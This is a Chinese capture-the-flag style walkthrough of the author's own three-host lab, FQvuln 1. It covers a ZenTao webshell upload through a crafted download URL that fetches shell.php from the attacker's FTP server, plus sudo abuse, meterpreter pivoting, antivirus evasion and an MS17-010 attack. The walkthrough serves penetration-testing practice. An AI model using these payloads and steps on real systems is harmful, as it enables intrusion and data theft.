> 原文链接: https://www.anquanke.com//post/id/232646 


# FQvuln 1靶场渗透测试实战


                                阅读量   
                                **235941**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">2</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p4.ssl.qhimg.com/t01bf3202705fc6511f.jpg)](https://p4.ssl.qhimg.com/t01bf3202705fc6511f.jpg)



## 前言

FQvuln靶场是风起原创漏洞靶场，集成了各种安全漏洞，适合在学习过程中检验自身渗透能力。目前FQvuln 1已经发布，难度相对适中。拓扑图如下：

[![](https://p5.ssl.qhimg.com/t01ccabe9e7d8aa9985.png)](https://p5.ssl.qhimg.com/t01ccabe9e7d8aa9985.png)



## 环境搭建

镜像下载链接：[https://pan.baidu.com/s/1d64CMFCOZMeWJ8V9BtyKuQ](https://pan.baidu.com/s/1d64CMFCOZMeWJ8V9BtyKuQ)<br>
提取码：l3zy<br>
推荐使用Vmware配置使用，网卡配置信息如拓扑图所示。

[![](https://p4.ssl.qhimg.com/t017243e43a1539fe0e.png)](https://p4.ssl.qhimg.com/t017243e43a1539fe0e.png)

添加网络VMnet2、VMnet3 配置类型为仅主机模式，子网地址分别为Target1：192.168.42.0/24 ，Target2：192.168.43.0/24。

**Target 1配置如下:**

[![](https://p1.ssl.qhimg.com/t01d1665102ae86e52f.png)](https://p1.ssl.qhimg.com/t01d1665102ae86e52f.png)

因为这里Target1模拟为对外项目管理系统，需要外网可以进行访问，所以网络适配器设置为NAT模式方便测试。网络适配器2设置为VMnet2，为第一层内网IP。

**Target 2 配置如下**

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01686a9394ac0757c0.png)

该主机为OA管理系统，网络适配器设置为自定义VMnet2，网络适配器2为VMnet3，这里VMnet3代表第二层内网段，是内网用户所在区域。**P.S.如果这里配置第二块网卡发现只识别了一个IP，那么则可以添加第三块网卡配置VMnet3，只是存在这个可能，望注意。**

**Target 3 配置如下**

[![](https://p5.ssl.qhimg.com/t01ecff97286356aae9.png)](https://p5.ssl.qhimg.com/t01ecff97286356aae9.png)

Target3仅需要配置一块网卡，为VMnet3即可，为内网用户主机。



## Web打点渗透

如果您是第一次复现该靶机，这里建议先独立渗透一遍，然后再根据个人情况浏览下文，效果会更好一些，当然以下仅作参考。

### <a class="reference-link" name="%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"></a>信息收集

首先对目标主机进行扫描，确定配置的IP的是多少。

[![](https://p5.ssl.qhimg.com/t01629f4e5ccd90211d.png)](https://p5.ssl.qhimg.com/t01629f4e5ccd90211d.png)

这里我们可以得到Tagrte1靶机的MAC地址为：00:0C:29:29:65:F7，然后使用`nmap -sn 192.168.174.0/24`对该网段进行扫描，得到目标靶机的IP地址为：192.168.174.132

[![](https://p4.ssl.qhimg.com/t01ca4c0c3c64c7bddd.png)](https://p4.ssl.qhimg.com/t01ca4c0c3c64c7bddd.png)

然后我们对192.168.174.132进行扫描，使用命令`nmap -T4  -sV -O 192.168.174.132`

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t011645c3345fa7fc22.png)

我们可以得到信息如下：<br>
开放端口：80(Apache)、3306(MySQL)<br>
操作系统：Linux(Ubuntu)<br>
MAC地址：00:0C:29:29:65:F7

首先访问[http://192.168.174.132](http://192.168.174.132) 界面如下：

[![](https://p3.ssl.qhimg.com/t01548b6db48f03ec83.png)](https://p3.ssl.qhimg.com/t01548b6db48f03ec83.png)

这里通过Wappalyzer得到信息与上面基本一致。我们可以知道这是一个禅道搭建的项目管理系统，通过F12我们可以再前端中得到该版本为V12.4.2，以及第一个提示。

[![](https://p0.ssl.qhimg.com/t01fa272b46b10d41d9.png)](https://p0.ssl.qhimg.com/t01fa272b46b10d41d9.png)

搜索关于禅道V12.4.2的相关漏洞，得到在该版本存在一个任意文件下载漏洞，然后我们进行复现。

### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"></a>漏洞复现

但是发现该漏洞需要后台权限，然后通过FUZZ发现禅道会对登录次数进行限制，所以爆破基本是不太可能的。那么我们根据提示在github上搜索WebExploit项目管理系统。发现得到了备份文件。

[![](https://p0.ssl.qhimg.com/t01bceba8fd79f1a103.png)](https://p0.ssl.qhimg.com/t01bceba8fd79f1a103.png)

通过对备份文件的审计，我们得到禅道的数据库配置文件为：/zentaopms/config/my.php

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t0147ed05e6e7ffa86b.png)

得到数据库用户名为:target1 密码：qwer123!@#，在之前的信息收集我们可以得知3306端口对外开放，那么我们进行尝试连接，发现成功连接数据库。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01752f7e1d2f3b3bd7.png)

于是我们检索数据库配置文件发现，后台用户密码hash，然后进行破解得到后台用户名及密码。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t0161cac60cfd1c1b88.png)

破解结果

[![](https://p4.ssl.qhimg.com/t01df354a3aa0eb6ad3.png)](https://p4.ssl.qhimg.com/t01df354a3aa0eb6ad3.png)

得到用户名：admin 密码：qazwsx123<br>
利用得到的账号密码成功登录至后台。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01a413115582cbab0c.png)

右上角有提示

[![](https://p4.ssl.qhimg.com/t012fcb64925a806861.png)](https://p4.ssl.qhimg.com/t012fcb64925a806861.png)

既然拿到后台权限那么我们开始GETSHELL吧！

开启一个FTP服务，这里使用python模块开启，命令：`python -m pyftpdlib -d /root/ftp -p 21` 注意提前在/root/ftp目录下存放webshell文件。

[![](https://p1.ssl.qhimg.com/t0122ae7126a0e8852e.png)](https://p1.ssl.qhimg.com/t0122ae7126a0e8852e.png)

如上图已经成功开启服务。<br>
FTP webshell地址为`ftp://192.168.174.128/shell.php` 然后将其地址进行base64加密。<br>
然后构建payload并进行访问：<br>`http://192.168.174.132/zentaopms/www/index.php?m=client&amp;f=download&amp;version=1&amp;link=ZnRwOi8vMTkyLjE2OC4xNzQuMTI4L3NoZWxsLnBocA==`<br>
显示保存成功。

[![](https://p0.ssl.qhimg.com/t01449c4d65bb24825d.png)](https://p0.ssl.qhimg.com/t01449c4d65bb24825d.png)

Webshell连接地址：`http://192.168.174.132/data/client/1/shell.php`

[![](https://p4.ssl.qhimg.com/t019a0f091dd238b992.png)](https://p4.ssl.qhimg.com/t019a0f091dd238b992.png)

连接成功！<br>
查看shell权限为www-data

[![](https://p5.ssl.qhimg.com/t01fe0dfb0e433afefd.png)](https://p5.ssl.qhimg.com/t01fe0dfb0e433afefd.png)

常规操作`sudo -l`看一下

[![](https://p4.ssl.qhimg.com/t01e08f59617a428674.png)](https://p4.ssl.qhimg.com/t01e08f59617a428674.png)

可以看到可以无需密码以任何权限执行/var/www/html/zentaopms/www/tips.sh文件。<br>
我们来尝试在文件中写入`whoami`并执行试一下。发现没有这个文件？不要紧，我们可以自己创建一个然后`chmod +x /var/www/html/zentaopms/www/tips.sh`赋予执行权限。

[![](https://p0.ssl.qhimg.com/t0110af710af49ae813.png)](https://p0.ssl.qhimg.com/t0110af710af49ae813.png)

然后我们可以全局搜索一下flag相关的文件名。<br>
在文件中写入`find / -name "*flag*"`并执行。

[![](https://p0.ssl.qhimg.com/t014cf57df8d09577f6.png)](https://p0.ssl.qhimg.com/t014cf57df8d09577f6.png)

然后查看flag文件，在文件中写入cat /root/flag1.txt并执行。

[![](https://p1.ssl.qhimg.com/t014e6beb50c6fe837d.png)](https://p1.ssl.qhimg.com/t014e6beb50c6fe837d.png)

得到第一个靶标！



## 内网渗透OA系统

### <a class="reference-link" name="%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"></a>信息收集

为了方便测试我们弹一个meterpreter，生成方法百度即可。**P.S.这里建议使用上述的提权方式弹一个root权限的shell。**

[![](https://p3.ssl.qhimg.com/t0113ccfc2b685c0b46.png)](https://p3.ssl.qhimg.com/t0113ccfc2b685c0b46.png)

查看到该靶机存在其他内网段，添加路由。

[![](https://p0.ssl.qhimg.com/t013f9f441cac9993f3.png)](https://p0.ssl.qhimg.com/t013f9f441cac9993f3.png)

挂一个socks4a代理。然后在本地上配置Proxifier进行探测。

[![](https://p3.ssl.qhimg.com/t01639b76e461b5878a.png)](https://p3.ssl.qhimg.com/t01639b76e461b5878a.png)

Proxifier配置如下（嗯，为啥是Socks5了？因为我重新配了呗）：

[![](https://p3.ssl.qhimg.com/t01adbc5a5573182e64.png)](https://p3.ssl.qhimg.com/t01adbc5a5573182e64.png)

发现192.168.42.129开放了80端口，因为我们在本地配置了代理，那么直接访问即可，发现是一个通达OA系统。这里建议在配置Proxifier时在代理规则处仅代理需要使用的程序即可，不然代理可能会崩。

[![](https://p2.ssl.qhimg.com/t017345fa3d7ac3fb42.png)](https://p2.ssl.qhimg.com/t017345fa3d7ac3fb42.png)

看到这个界面百度一下风起的通达EXP，直接秒就行，不用犹豫。这里需要注意的是，对于通达OA的shell如果是手动复现，不能是一句话木马，可以使用调用windows COM组件的webshell或者具有一定混淆功能的木马。

[![](https://p4.ssl.qhimg.com/t0132aa6ff0d2eca487.png)](https://p4.ssl.qhimg.com/t0132aa6ff0d2eca487.png)

然后连接webshell，查看用户权限为**oa-pc\oa**

[![](https://p4.ssl.qhimg.com/t0150fe9befa391ebe1.png)](https://p4.ssl.qhimg.com/t0150fe9befa391ebe1.png)

如下图，我们可以得到这是一台windows7主机以及相关配置信息。

[![](https://p0.ssl.qhimg.com/t013253c9bb06d07587.png)](https://p0.ssl.qhimg.com/t013253c9bb06d07587.png)

继续信息收集，查看是否存在杀软，命令:tasklist /svc，在线查询一下，发现存在火绒以及D盾，所以这也明确了，这是本靶场难度较高的一环，难在我们需要熟悉免杀技术，与绝大数靶场不同，这也是最贴近真实的一个细节。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t016a678b2d3cfe4c9e.png)

当然这里我装的是火绒的杀毒软件，熟悉免杀的小伙伴都知道，这个是比较容易过的杀软了，我觉得免杀技术最重要的还是编程技术，如果说免杀所需的代码不能独立完成的话，建议重新学习一下编程，这在整个渗透测试的环节很重要的，也是区别于脚本小子和白帽的一个分水岭。所以笔者也建议可以加强代码的学习，如果觉得会编程技术，但是还是写不出来，那还应继续学习多思考。

### <a class="reference-link" name="%E6%A8%AA%E5%90%91%E6%B5%8B%E8%AF%95"></a>横向测试

下面言归正传，上传免杀msf木马，获得一个meterpreter会话。这里需要注意因为target2不出网，所以我们需要使用正向连接的payload。<br>**P.S.相信操作到这一步的时候，大部分小伙伴会好奇为啥弹不回shell？那么这里提示一下，为啥不看看windows防火墙是否开启呢？那么该怎么做不用多说了吧**

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t0112b05aa5c9cd2564.png)

提权至system权限后，使用命令全局检索C盘下的flag相关的文件名。<br>
命令:**dir /s /b c:*flag***

[![](https://p4.ssl.qhimg.com/t013242b537e60d91ec.png)](https://p4.ssl.qhimg.com/t013242b537e60d91ec.png)

得到第二个靶标！<br>
当然这里有一个小提示就是在关闭Windows防火墙后为什么不试着再看一遍开放端口呢？攻击的方式不止一个。

在获取到OA系统权限后，继续查看是否存在其他网段。发现存在192.168.43.0/24网段，进行探测存活主机。

[![](https://p5.ssl.qhimg.com/t014841838c888396af.png)](https://p5.ssl.qhimg.com/t014841838c888396af.png)

探测结果如下：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01d8f057d269cac7aa.png)

发现一个192.168.43.128的主机<br>
继续我们对目标主机进行端口扫描以及操作系统探测。

[![](https://p0.ssl.qhimg.com/t01952fb928e64cf9e6.png)](https://p0.ssl.qhimg.com/t01952fb928e64cf9e6.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01ea44b580e139a43e.png)



## 拿下内网主机

发现开放445端口，并且操作系统是windows server 2008，那么直接盲打一波MS17-010。主机载荷使用正向连接哦，因为目标主机不出网。当然这里不建议使用msf的exp，因为很不稳定，成功率较低，可以使用python版的exp进行攻击，这里为了方便演示使用的msf。

[![](https://p1.ssl.qhimg.com/t0171bf1a7f599403bf.png)](https://p1.ssl.qhimg.com/t0171bf1a7f599403bf.png)

获得最后一个靶标！

渗透结束。



## 后记

本靶场不进行任何盈利活动，推广请标注来源。希望通过FQvuln靶场的学习能够对您有所收获，谢谢阅读！

**P.S.小安是我大哥**
